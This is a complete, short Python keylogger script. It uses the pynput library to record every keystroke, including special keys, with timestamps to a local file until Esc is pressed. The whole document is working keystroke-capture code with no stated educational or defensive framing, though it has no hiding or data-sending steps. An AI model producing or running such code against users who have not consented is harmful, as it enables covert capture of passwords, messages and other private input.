from pynput.keyboard import Key, Listener
import logging

# Set up logging to save keystrokes to a file
log_file = "keylogs.txt"  # Change the file path if needed
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    """Callback for when a key is pressed."""
    try:
        logging.info(str(key.char))  # Log character keys
    except AttributeError:
        logging.info(f"Special Key: {key}")  # Log special keys (e.g., Shift, Enter)

def on_release(key):
    """Callback for when a key is released."""
    if key == Key.esc:  # Stop listener if Esc key is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
